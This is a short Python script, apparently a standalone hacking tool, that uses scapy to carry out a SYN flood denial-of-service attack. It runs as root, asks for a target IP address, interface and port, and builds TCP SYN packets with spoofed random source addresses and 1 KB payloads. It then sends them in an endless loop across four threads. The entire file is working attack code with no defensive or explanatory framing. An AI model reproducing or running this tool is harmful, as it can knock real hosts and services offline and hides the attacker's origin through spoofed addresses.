import scapy.all as scapy
import threading
import os

print("""

██╗░░██╗██╗░░██╗██████╗░░█████╗░░█████╗░░██████╗
╚██╗██╔╝██║░░██║╚════██╗██╔══██╗██╔═══╝░██╔════╝
░╚███╔╝░███████║░█████╔╝██║░░╚═╝██████╗░╚█████╗░
░██╔██╗░██╔══██║░╚═══██╗██║░░██╗██╔══██╗░╚═══██╗
██╔╝╚██╗██║░░██║██████╔╝╚█████╔╝╚█████╔╝██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═════╝░
""")

if not os.geteuid()==0:
    print('This script must be run as root!')
    exit(1)
else:
    print("User is root, the script can continue...\n")

ipaddr = input("Enter target IP address > ")
interface = input("Enter your interface name > ")
try:
    tport = int(input("Enter target port > "))
except ValueError:
    print("Invalid input.")
    exit()

def gen(target_ip, target_port):
    ip = scapy.IP(dst=target_ip, src=scapy.RandIP("192.168.1.1/24"))

    tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")

    raw = scapy.Raw(b"X"*1024)

    p = ip / tcp / raw
    return p

def attack(p, intface):
    scapy.send(p, iface=intface, loop=1, verbose=0)

print("<+> Generating packet.")

p = gen(ipaddr, tport)

print("<+> Starting attack.")

t1 = threading.Thread(target=lambda: attack(p, interface))
t1.start()
t2 = threading.Thread(target=lambda: attack(p, interface))
t2.start()
t3 = threading.Thread(target=lambda: attack(p, interface))
t3.start()
t4 = threading.Thread(target=lambda: attack(p, interface))
t4.start()

print("<+> Started attack.")